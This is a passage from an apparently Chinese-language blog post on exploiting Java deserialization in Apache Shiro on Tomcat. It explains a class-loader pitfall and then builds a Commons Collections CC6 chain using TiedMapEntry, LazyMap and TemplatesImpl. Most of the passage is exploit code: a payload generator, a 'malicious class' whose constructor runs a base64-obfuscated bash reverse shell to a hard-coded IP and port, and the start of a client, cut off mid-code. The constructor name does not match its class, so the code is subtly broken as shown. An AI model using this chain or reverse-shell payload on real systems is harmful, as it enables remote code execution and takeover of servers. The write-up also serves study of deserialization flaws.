&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020959932.png" alt="image-20220302020959932">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302021055809.png" alt="image-20220302021055809">&lt;/p>
&lt;p>被正常解析&lt;/p>
&lt;p>经过上面的调试我们可以得出结论：当反序列化流中出现非java自身的数组，会引起&lt;code>ParallelWebappClassLoader&lt;/code>触发双亲委托机制，将对象交给上层的&lt;code>URLClassLoader&lt;/code>进行处理，由于参数的不匹配，自然就出现无法加载类的错误&lt;/p>
&lt;h3 id="搞个行的">搞个行的&lt;/h3>
&lt;p>既然问题出在非java原生的Transformer数组上，我们把它换为&lt;code>TiedMapEntry&lt;/code>，构造函数接收两个参数 Map和Key，它有一个&lt;code>getValue&lt;/code>方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>当我们出传入的map是LazyMap时，这个get就可以触发transform的回调了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">containsKey&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>前面用到&lt;code>get&lt;/code>时我们并不关心传入的key，因为重点在Transformer数组的ConstantTransformer，我们通过它来初始化恶意对象&lt;/p>
&lt;p>而仔细看这里的key会被传入&lt;code>transform&lt;/code>，它可以扮演ConstantTransformer的角色&lt;/p>
&lt;p>再回看Transformer数组&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>第二行可以去掉，数组长度变为1，数组也不需要了&lt;/p>
&lt;p>编写一下exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC6Shiro&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">clsBytes&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">clsBytes&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getClass&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TiedMapEntry&lt;/span> &lt;span style="color:#111">tme&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">expMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">tme&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;valuevalue&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">clear&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 同outerMap.clear()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iMethodName&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>恶意类&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.DOM&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.TransletException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xml.internal.serializer.SerializationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC6ShiroEvil&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">DOM&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SerializationHandler&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">handlers&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">TransletException&lt;/span> &lt;span style="color:#f92672">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">DOM&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">DTMAxisIterator&lt;/span> &lt;span style="color:#111">iterator&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SerializationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">TransletException&lt;/span> &lt;span style="color:#f92672">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Evil&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello TemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ==}|{base64,-d}|{bash,-i}&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过Client.java装配CC6Shiro&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassPool&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.CtClass&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.shiro.crypto.AesCipherService&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.shiro.util.ByteSource&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC6ShiroClient&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassPool&lt;/span> &lt;span style="color:#111">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ClassPool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
